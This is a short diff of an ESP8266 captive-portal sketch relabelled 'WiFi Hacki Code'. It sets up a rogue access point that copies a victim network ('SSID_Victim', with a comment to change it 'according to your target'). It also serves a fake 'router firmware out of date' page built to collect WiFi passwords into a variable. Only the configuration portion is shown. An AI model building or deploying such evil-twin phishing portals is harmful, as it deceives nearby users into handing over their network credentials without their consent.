@@ -1,16 +1,16 @@
-// ESP8266 WiFi Captive Portal
-// By 125K (github.com/125K)
+// WiFi Hacki Code by Hacki Tech
 
-// Libraries
+// Important Libraries
 #include <ESP8266WiFi.h>
 #include <DNSServer.h> 
 #include <ESP8266WebServer.h>
 #include <EEPROM.h>
 
 // Default SSID name
-const char* SSID_NAME = "Hacki_tech";
+const char* SSID_NAME = "SSID_Victim"; // Change SSID_Victim according to your target
 
 // Default main strings
+// You can Change the below strings according to your use 
 #define SUBTITLE "Router info."
 #define TITLE "Update"
 #define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
@@ -23,7 +23,7 @@ const char* SSID_NAME = "Hacki_tech";
 const byte HTTP_CODE = 200;
 const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
-IPAddress APIP(192, 168, 1, 1); // Gateway
+IPAddress APIP(192, 168, 1, 1); // Gateway(Change This gateway IP according to your need)
 
 String allPass = "";
 String newSSID = "";
